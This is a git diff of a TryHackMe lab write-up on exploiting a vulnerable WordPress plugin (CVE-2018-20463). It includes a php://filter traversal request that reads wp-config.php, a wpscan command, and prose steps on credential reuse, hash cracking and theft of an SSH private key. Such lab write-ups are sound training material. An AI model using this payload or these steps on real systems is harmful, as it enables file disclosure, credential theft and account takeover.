@@ -1,4 +1,4 @@
-# This is a Medium Level Tryhackme Lab, Where we exploit a wordpress website which is vulnerable to SSRF(Server Side Request Forgery) that is marked CVE-2018-20463. which allow   us  to read any file on the server . then we Get a foothold by and start to Lateral Move from user to user until we Reach root.
+# This is a Medium Level Tryhackme Lab, Where we exploit a wordpress website which is vulnerable to SSRF(Server Side Request Forgery) that is marked CVE-2018-20463. which allow   us  to read any file on the server . then we Get a foothold  and start to Lateral Move from user to user until we Reach root.
 
 
 # 1- Reconnaissance
@@ -15,7 +15,7 @@ We Start with a basic nmap scan, Then a version Scan to see if there are any out
 
 
 ##
-# 3- Then i Started enumerating the wordpress website using wpscan, it is  black-box WordPress vulnerability scanner used to audit WordPress websites for security flaws, misconfigurations, and outdated components
+# 3- Then i Started enumerating the wordpress website using wpscan, it is  black-box WordPress vulnerability scanner used to audit WordPress websites for security flaws, misconfigurations, and outdated components.
 
 ```
 wpscan --url http://target.com/ -e ap
@@ -45,8 +45,8 @@ http://localhost/wp-content/plugins/jsmol2wp/php/jsmol.php
 &query=php://filter/resource=../../../../wp-config.php
 ```
 https://github.com/sullo/advisory-archives/blob/master/wordpress-jsmol2wp-CVE-2018-20463-CVE-2018-20462.txt
-```
-```
+
+
 # 6 - We can read the config files, which left us some credentials of a user called "wpuser" 
 <img width="1911" height="887" alt="Screenshot 2026-11-18 010055" src="https://github.com/user-attachments/assets/60c4dd3e-3ee1-47e6-aaf7-09c541604294" />
 
@@ -64,7 +64,7 @@ https://github.com/sullo/advisory-archives/blob/master/wordpress-jsmol2wp-CVE-20
 http://localhost/wp-content/plugins/jsmol2wp/php/jsmol.php
 ?isform=true
 &call=getRawDataFromDatabase
-&query=php://filter/resource=../../../../wp-config.php
+&query=php://filter/resource=../../hello.php
 ```
 <img width="1917" height="736" alt="Screenshot 2026-11-18 010233" src="https://github.com/user-attachments/assets/ab75fb1e-01eb-4423-b1a9-f42b2439e947" />
 
@@ -106,7 +106,7 @@ bash /tmp/file.sh
 <img width="1881" height="671" alt="Screenshot 2026-11-18 013434" src="https://github.com/user-attachments/assets/3adef812-2942-4984-987b-485035b5e760" />
 
 ##
-# 14 - We got a foothold time to eneumreate for privilege escalation, i tried tranferring and using linpeas but gave me false positive flags, and no suid binaries i ran "ps aux" and i found a mysql server running i used wpuser credentials 
+# 14 - We got a foothold time to enumerate for privilege escalation, i tried tranferring and using linpeas but gave me false positive flags, and no suid binaries i ran "ps aux" and i found a mysql server running i used wpuser credentials 
 <img width="1152" height="617" alt="Screenshot 2026-11-18 013543" src="https://github.com/user-attachments/assets/283ece2c-955d-4d9b-8c73-0ad53bca6213" />
 
 <img width="1100" height="260" alt="image" src="https://github.com/user-attachments/assets/39b886bd-cdc0-4a02-97ac-82f46474f809" />
@@ -115,7 +115,7 @@ bash /tmp/file.sh
 # 15 - I took diego hashed password and tried to crack the hashed password using johntheripper tool 
 <img width="1856" height="658" alt="Screenshot 2026-11-18 015823" src="https://github.com/user-attachments/assets/b9cac26c-a951-4650-b060-8f75e14bb379" />
 
-# 16 - i switched to diego and diego can access the user "think" directory and from there we fidn a .ssh which we take the id_rsa of think and login via ssh
+# 16 - i switched to diego and diego can access the user "think" directory and from there we find a .ssh which we take the id_rsa of think and login via ssh
 
 <img width="1871" height="667" alt="Screenshot 2026-11-18 015944" src="https://github.com/user-attachments/assets/3e43b369-87a3-420f-8f72-c06ea5faebb3" />
 
